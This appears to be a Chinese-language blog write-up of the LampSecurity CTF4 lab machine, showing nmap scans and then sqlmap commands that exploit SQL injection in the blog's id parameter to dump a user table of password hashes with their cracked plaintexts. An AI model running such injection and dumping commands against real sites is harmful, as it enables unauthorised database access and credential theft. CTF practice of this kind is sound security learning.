---
icon: pen-to-square
date: 2025-08-13
title: LampSecurityCTF4
tags: 
category:
  - 项目
---
## 信息收集
开启虚拟机，NAT，扫描对应C段，发现主机
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 22:58 CST
Nmap scan report for 192.168.254.1
Host is up (0.00038s latency).
Nmap scan report for 192.168.254.145
Host is up (0.00046s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 16.88 seconds
```
详细信息扫描
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 23:18 CST
Nmap scan report for 192.168.254.145
Host is up (0.00095s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.254.1], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
|_http-server-header: Apache/2.2.0 (Fedora)
| http-robots.txt: 5 disallowed entries
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-title:  Prof. Ehks
631/tcp closed ipp
Device type: general purpose|remote management|webcam|terminal server|proxy server|switch|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X (96%), Control4 embedded (94%), Mobotix embedded (94%), Lantronix embedded (94%), SonicWALL embedded (93%), SNR embedded (93%), Dell iDRAC 6 (92%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:lantronix:slc_8 cpe:/o:sonicwall:aventail_ex-6000 cpe:/h:snr:snr-s2960 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:3.10
Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (96%), Linux 2.6.13 - 2.6.32 (95%), Control4 HC-300 home controller or Mobotix M22 camera (94%), Lantronix SLC 8 terminal server (Linux 2.6) (94%), SonicWALL Aventail EX-6000 VPN appliance (93%), SNR SNR-S2960 switch (93%), Linux 2.6.8 - 2.6.30 (92%), Linux 2.6.23 (92%), Linux 2.6.9 - 2.6.18 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds

```

## 在blog界面的url发现sql注入
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250816002316.png)
由于是PHP报错，所以不会返回报错信息，那么可以使用布尔盲注，配合`bp`得到数据库名`ehks`
下面转入sqlmap操作
### sqlmap一路脱库
不得不赞叹`sqlmap`真是太nb了
```bash
sqlmap --batch -D ehks -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" -p id
初步对接sqlmap

sqlmap -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" --tables -D ehks
拖表

+---------+
| comment |
| user    |
| blog    |
+---------+

sqlmap -u "http://192.168.254.145/index.html?page=blog&title=Blog&id=1" --dump -D ehks -T user
脱user表
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+
```
是真66666